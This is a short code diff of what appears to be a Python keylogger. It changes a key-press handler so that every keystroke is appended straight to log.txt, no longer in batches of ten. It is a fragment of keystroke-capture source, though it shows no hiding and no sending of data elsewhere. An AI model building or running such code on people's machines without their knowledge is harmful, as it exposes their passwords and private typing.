@@ -12,15 +12,12 @@ def get_keypress(key):
     keys.append(key)
     count += 1
 
-    if count >= 10:
-        count = 0
-        write(keys)
-        keys = []
+    write(keys)
 
 def get_keyrelease(key):
-    message = ''
     if key == Key.esc:
         return False
+
 
 def write(keys):
     with open("log.txt", "a") as f:
